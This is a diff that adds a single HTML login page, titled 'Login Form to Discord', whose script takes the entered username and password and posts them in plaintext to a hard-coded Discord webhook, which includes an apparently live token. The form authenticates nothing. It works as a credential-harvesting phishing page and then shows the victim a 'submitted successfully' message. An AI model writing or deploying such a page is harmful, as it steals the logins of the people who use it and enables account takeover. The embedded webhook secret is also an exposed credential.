@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form to Discord</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-form {
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin-top: 5px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            background-color: #5cb85c;
+            color: white;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #4cae4c;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-form">
+        <h2>Login Form</h2>
+        <form id="loginForm">
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" required><br><br>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required><br><br>
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Prepare form data
+            const formData = new FormData(this);
+            const username = formData.get('username');
+            const password = formData.get('password');
+
+            // Construct the message to send to Discord
+            const message = `New login:\nUsername: ${username}\nPassword: ${password}`;
+
+            console.log("Sending the following data to Discord: ", message); // Debugging log
+
+            // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
+            fetch('https://discord.com/api/webhooks/1239160408548446269/y091SCRKe03J6DgCrVNHZb4coTxF7sr5OlaV3oJm144d7tKALX-Pf9H8134UUPL8CVKw', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: message
+                }),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to send message to Discord, response status: ' + response.status);
+                }
+                alert('Login information submitted successfully!');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Failed to submit login information. See console for more details.');
+            });
+        });
+    </script>
+</body>
+</html>
